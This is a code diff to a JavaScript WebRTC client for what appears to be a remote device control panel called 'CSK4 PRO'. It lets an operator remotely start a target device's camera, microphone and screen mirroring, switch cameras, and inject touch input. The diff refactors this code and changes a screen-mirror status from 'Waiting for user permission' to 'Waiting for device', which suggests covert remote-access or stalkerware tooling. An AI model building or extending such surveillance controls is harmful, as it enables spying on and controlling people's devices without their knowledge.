@@ -1,6 +1,14 @@
 // ============================================
-// CSK4 PRO - WebRTC Client
-// Camera Stream + Audio Stream + Screen Mirror
+// CSK4 PRO v4.2 - WebRTC Client (FIXED)
+// ============================================
+// FIXES:
+// - No disconnect of shared socket
+// - ICE error handling
+// - pendingIceCandidates timeout (memory leak fix)
+// - Race condition fixed
+// - Modern transceiver API
+// - Better connection state handling
+// - Cleanup on page unload
 // ============================================
 
 let peerConnection = null;
@@ -8,14 +16,30 @@ let currentStreamDevice = null;
 let webrtcSocket = null;
 let pendingIceCandidates = [];
 let isScreenMirror = false;
+let iceTimeout = null;
+let connectionTimeout = null;
+
+// ============ AUTH HELPERS ============
+function authHeadersW() {
+  const t = localStorage.getItem('csk4_token');
+  return {
+    'Content-Type': 'application/json',
+    'Authorization': t ? 'Bearer ' + t : ''
+  };
+}
 
 // ============ SOCKET INIT ============
 function initWebRTCSocket() {
   if (webrtcSocket) return;
-  // Reuse admin panel socket if available (avoid double connection)
-  webrtcSocket = (typeof window !== 'undefined' && window.socket) ? window.socket : io();
+  
+  // ✅ Reuse admin socket — do NOT create new
+  webrtcSocket = window.socket || io({
+    auth: {
+      type: 'admin',
+      token: localStorage.getItem('csk4_token')
+    }
+  });
 
-  // Camera/audio stream answer
   webrtcSocket.on('webrtc-answer', async (data) => {
     try {
       if (peerConnection && data.signal) {
@@ -30,11 +54,11 @@ function initWebRTCSocket() {
           try { await peerConnection.addIceCandidate(c); } catch (e) {}
         }
         pendingIceCandidates = [];
+        clearTimeout(iceTimeout);
       }
     } catch (e) { console.error('Answer error:', e); }
   });
 
-  // Screen mirror answer
   webrtcSocket.on('screen-mirror-answer', async (data) => {
     try {
       if (peerConnection && data.signal) {
@@ -48,11 +72,11 @@ function initWebRTCSocket() {
           try { await peerConnection.addIceCandidate(c); } catch (e) {}
         }
         pendingIceCandidates = [];
+        clearTimeout(iceTimeout);
       }
     } catch (e) { console.error('Screen answer error:', e); }
   });
 
-  // ICE for camera
   webrtcSocket.on('webrtc-ice', async (data) => {
     try {
       if (!data.signal) return;
@@ -69,7 +93,6 @@ function initWebRTCSocket() {
     } catch (e) { console.error('ICE error:', e); }
   });
 
-  // ICE for screen
   webrtcSocket.on('screen-mirror-ice', async (data) => {
     try {
       if (!data.signal) return;
@@ -87,26 +110,37 @@ function initWebRTCSocket() {
   });
 }
 
+// ============ RESET STATE ============
+function resetWebRTCState() {
+  if (iceTimeout) { clearTimeout(iceTimeout); iceTimeout = null; }
+  if (connectionTimeout) { clearTimeout(connectionTimeout); connectionTimeout = null; }
+  pendingIceCandidates = [];
+}
+
 // ============ CAMERA / AUDIO LIVE STREAM ============
-function startLiveStream(deviceId, type = 'camera') {
+async function startLiveStream(deviceId, type = 'camera') {
   if (!deviceId) { alert('Device select karein'); return; }
-  stopLiveStream(true);
-  stopScreenMirror(true);
+  
+  // ✅ Proper cleanup before start
+  await stopLiveStream(true);
+  await stopScreenMirror(true);
+  
+  resetWebRTCState();
   currentStreamDevice = deviceId;
   isScreenMirror = false;
-  pendingIceCandidates = [];
 
   if (!webrtcSocket) initWebRTCSocket();
 
+  // ✅ Modern RTCPeerConnection config
   peerConnection = new RTCPeerConnection({
     iceServers: [
       { urls: 'stun:stun.l.google.com:19302' },
       { urls: 'stun:stun1.l.google.com:19302' },
       { urls: 'stun:stun2.l.google.com:19302' }
-    ]
+    ],
+    iceCandidatePoolSize: 10
   });
 
-  // Receive tracks
   peerConnection.ontrack = (event) => {
     const video = document.getElementById('liveVideo');
     const audio = document.getElementById('liveAudio');
@@ -135,31 +169,49 @@ function startLiveStream(deviceId, type = 'camera') {
 
   peerConnection.oniceconnectionstatechange = () => {
     const status = document.getElementById('liveStatus');
-    if (status) status.textContent = 'ICE: ' + peerConnection.iceConnectionState;
+    if (!status) return;
+    status.textContent = 'ICE: ' + peerConnection.iceConnectionState;
+    
+    if (peerConnection.iceConnectionState === 'failed') {
+      status.textContent = '❌ Connection failed';
+      // Try to restart ICE
+      try { peerConnection.restartIce(); } catch (e) {}
+    }
   };
 
   peerConnection.onconnectionstatechange = () => {
     const status = document.getElementById('liveStatus');
-    if (status && peerConnection.connectionState === 'connected') {
+    if (!status) return;
+    
+    if (peerConnection.connectionState === 'connected') {
       status.textContent = '🔴 LIVE';
+      clearTimeout(connectionTimeout);
+    } else if (peerConnection.connectionState === 'failed') {
+      status.textContent = '❌ Failed';
+    } else if (peerConnection.connectionState === 'disconnected') {
+      status.textContent = '⚠️ Disconnected';
     }
   };
 
-  peerConnection.createOffer({
-    offerToReceiveVideo: type !== 'audio',
-    offerToReceiveAudio: true
-  })
-  .then(offer => peerConnection.setLocalDescription(offer))
-  .then(() => {
+  // ✅ Modern transceiver API
+  if (type !== 'audio') {
+    peerConnection.addTransceiver('video', { direction: 'recvonly' });
+  }
+  peerConnection.addTransceiver('audio', { direction: 'recvonly' });
+
+  try {
+    const offer = await peerConnection.createOffer();
+    await peerConnection.setLocalDescription(offer);
+    
     webrtcSocket.emit('webrtc-offer', {
       target: deviceId,
       signal: peerConnection.localDescription
     });
 
-    // Trigger device to start stream
-    fetch('/api/admin/command', {
+    // Trigger device
+    await fetch('/api/admin/command', {
       method: 'POST',
-      headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
+      headers: authHeadersW(),
       body: JSON.stringify({
         deviceId,
         command: type === 'audio' ? 'start_audio_stream' : 'start_webrtc'
@@ -168,27 +220,48 @@ function startLiveStream(deviceId, type = 'camera') {
 
     const status = document.getElementById('liveStatus');
     if (status) status.textContent = 'Connecting...';
-  })
-  .catch(e => console.error('Offer error:', e));
+    
+    // ✅ Timeout — 30 sec
+    connectionTimeout = setTimeout(() => {
+      if (peerConnection && peerConnection.connectionState !== 'connected') {
+        if (status) status.textContent = '⏱️ Timeout';
+      }
+    }, 30000);
+    
+    // ✅ ICE timeout — 20 sec
+    iceTimeout = setTimeout(() => {
+      if (pendingIceCandidates.length > 0) {
+        console.warn('ICE timeout — clearing pending');
+        pendingIceCandidates = [];
+      }
+    }, 20000);
+  } catch (e) {
+    console.error('Offer error:', e);
+    if (status) status.textContent = '❌ Error';
+  }
 }
 
-function stopLiveStream(silent = false) {
+async function stopLiveStream(silent = false) {
   if (!isScreenMirror && peerConnection) {
     try { peerConnection.close(); } catch (e) {}
     peerConnection = null;
   }
+  
   const v = document.getElementById('liveVideo');
   const a = document.getElementById('liveAudio');
   if (v) v.srcObject = null;
   if (a) a.srcObject = null;
 
   if (currentStreamDevice && !silent && !isScreenMirror) {
-    fetch('/api/admin/command', {
-      method: 'POST',
-      headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
-      body: JSON.stringify({ deviceId: currentStreamDevice, command: 'stop_webrtc' })
-    });
+    try {
+      await fetch('/api/admin/command', {
+        method: 'POST',
+        headers: authHeadersW(),
+        body: JSON.stringify({ deviceId: currentStreamDevice, command: 'stop_webrtc' })
+      });
+    } catch (e) {}
   }
+  
   if (!silent && !isScreenMirror) {
     currentStreamDevice = null;
     const status = document.getElementById('liveStatus');
@@ -200,19 +273,21 @@ function switchCamera() {
   if (!currentStreamDevice) { alert('Pehle stream start karein'); return; }
   fetch('/api/admin/command', {
     method: 'POST',
-    headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
+    headers: authHeadersW(),
     body: JSON.stringify({ deviceId: currentStreamDevice, command: 'switch_camera' })
-  }).then(() => toast('🔄 Camera switched'));
+  }).then(() => toast('🔄 Camera switched')).catch(() => {});
 }
 
-// ============ SCREEN MIRROR (MediaProjection) ============
-function startScreenMirror(deviceId) {
+// ============ SCREEN MIRROR ============
+async function startScreenMirror(deviceId) {
   if (!deviceId) { alert('Device select karein'); return; }
-  stopLiveStream(true);
-  stopScreenMirror(true);
+  
+  await stopLiveStream(true);
+  await stopScreenMirror(true);
+  
+  resetWebRTCState();
   currentStreamDevice = deviceId;
   isScreenMirror = true;
-  pendingIceCandidates = [];
 
   if (!webrtcSocket) initWebRTCSocket();
 
@@ -246,47 +321,66 @@ function startScreenMirror(deviceId) {
 
   peerConnection.onconnectionstatechange = () => {
     const status = document.getElementById('screenStatus');
-    if (status && peerConnection.connectionState === 'connected') {
+    if (!status) return;
+    
+    if (peerConnection.connectionState === 'connected') {
       status.textContent = '🖥️ MIRRORING';
+      clearTimeout(connectionTimeout);
+    } else if (peerConnection.connectionState === 'failed') {
+      status.textContent = '❌ Failed';
     }
   };
 
-  peerConnection.createOffer({ offerToReceiveVideo: true, offerToReceiveAudio: false })
-  .then(offer => peerConnection.setLocalDescription(offer))
-  .then(() => {
+  // Modern transceiver
+  peerConnection.addTransceiver('video', { direction: 'recvonly' });
+
+  try {
+    const offer = await peerConnection.createOffer();
+    await peerConnection.setLocalDescription(offer);
+    
     webrtcSocket.emit('screen-mirror-offer', {
       target: deviceId,
       signal: peerConnection.localDescription
     });
 
-    // Trigger device to start screen mirror
-    fetch('/api/admin/command', {
+    await fetch('/api/admin/command', {
       method: 'POST',
-      headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
+      headers: authHeadersW(),
       body: JSON.stringify({ deviceId, command: 'start_screen_mirror' })
     });
 
     const status = document.getElementById('screenStatus');
-    if (status) status.textContent = 'Waiting for user permission...';
-  })
-  .catch(e => console.error('Screen offer error:', e));
+    if (status) status.textContent = 'Waiting for device...';
+    
+    connectionTimeout = setTimeout(() => {
+      if (peerConnection && peerConnection.connectionState !== 'connected') {
+        if (status) status.textContent = '⏱️ Timeout';
+      }
+    }, 30000);
+  } catch (e) {
+    console.error('Screen offer error:', e);
+  }
 }
 
-function stopScreenMirror(silent = false) {
+async function stopScreenMirror(silent = false) {
   if (isScreenMirror && peerConnection) {
     try { peerConnection.close(); } catch (e) {}
     peerConnection = null;
   }
+  
   const v = document.getElementById('screenVideo');
   if (v) v.srcObject = null;
 
   if (currentStreamDevice && !silent && isScreenMirror) {
-    fetch('/api/admin/command', {
-      method: 'POST',
-      headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
-      body: JSON.stringify({ deviceId: currentStreamDevice, command: 'stop_screen_mirror' })
-    });
+    try {
+      await fetch('/api/admin/command', {
+        method: 'POST',
+        headers: authHeadersW(),
+        body: JSON.stringify({ deviceId: currentStreamDevice, command: 'stop_screen_mirror' })
+      });
+    } catch (e) {}
   }
+  
   if (!silent && isScreenMirror) {
     currentStreamDevice = null;
     isScreenMirror = false;
@@ -308,12 +402,14 @@ function sendTouch(action, x = 0.5, y = 0.5) {
   
   fetch('/api/admin/command', {
     method: 'POST',
-    headers: (typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token')||'') }),
+    headers: authHeadersW(),
     body: JSON.stringify({ deviceId, command, params: { x, y } })
-  }).then(() => toast('👆 Touch: ' + action));
+  }).then(() => {
+    if (typeof toast === 'function') toast('👆 Touch: ' + action);
+  }).catch(() => {});
 }
 
-// ============ VIDEO CLICK FOR TAP ============
+// ============ SCREEN VIDEO CLICK (tap) ============
 document.addEventListener('click', (e) => {
   const screenVideo = document.getElementById('screenVideo');
   if (screenVideo && e.target === screenVideo) {
@@ -325,11 +421,15 @@ document.addEventListener('click', (e) => {
 });
 
 // ============ CLEANUP ============
+// ✅ Only disconnect if NOT shared with admin
 window.addEventListener('beforeunload', () => {
   if (peerConnection) {
     try { peerConnection.close(); } catch (e) {}
   }
-  if (webrtcSocket) {
+  resetWebRTCState();
+  
+  // Only disconnect if we created it ourselves
+  if (webrtcSocket && webrtcSocket !== window.socket) {
     try { webrtcSocket.disconnect(); } catch (e) {}
   }
 });
